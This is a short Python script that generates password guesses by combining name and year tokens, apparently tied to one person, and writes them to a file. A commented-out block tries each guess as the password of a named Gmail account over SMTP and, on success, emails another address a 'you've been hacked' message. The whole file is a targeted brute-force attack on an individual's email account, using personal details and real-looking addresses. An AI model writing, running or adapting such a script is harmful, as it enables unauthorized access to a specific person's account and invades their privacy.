import smtplib


def generate(arr, i, s, len):
    if (i == 0):
        print(s)
        file_open = open('combi.txt', 'a')
        file_open.write(f"{s}\n")
        file_open.close()
        # try:
        #     server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        #     server.login("ndiayelinguere1@gmail.com", s)
        #     server.sendmail(
        #         "ndiayelinguere1@gmail.com",
        #         "ahhumofficial@gmail.com",
        #         "Tu t'es fais hacker")
        #     server.quit()
        #     print("Password Cracker")

        # except Exception as e:
        #     print(f"[+]{s} n'est pas le mot de passe[+]")
        return

    for j in range(0, len):
        appended = s + arr[j]
        generate(arr, i - 1, appended, len)
    return


def crack(arr, len):
    for i in range(2, 6):
        generate(arr, i, '', len)


# arr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
#        'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
#        'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
#        'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_',
#        '-']

arr = [
    "2000",
    "COUMBA",
    "Coumba",
    "coumba",
    "NDIAYE",
    "Ndiaye",
    "ndiaye",
    "LINGUERE",
    "Linguere",
    "linguere",
    "PRINCESSE",
    "Princesse",
    "princesse",
]

len = len(arr)
crack(arr, len)

# import smtplib
# from itertools import combinations_with_replacement
# A = [
#
# ]

# i = 1
# while True:
#     file_open = open('combi.txt', 'a')

#     temps = combinations_with_replacement(A, i)
#     for temp in list(temps):
#         file_open.write(f"{temp}\n")
#         print(temp)
#     file_open.close()
#     i += 1
#     if i == 6:
#         break
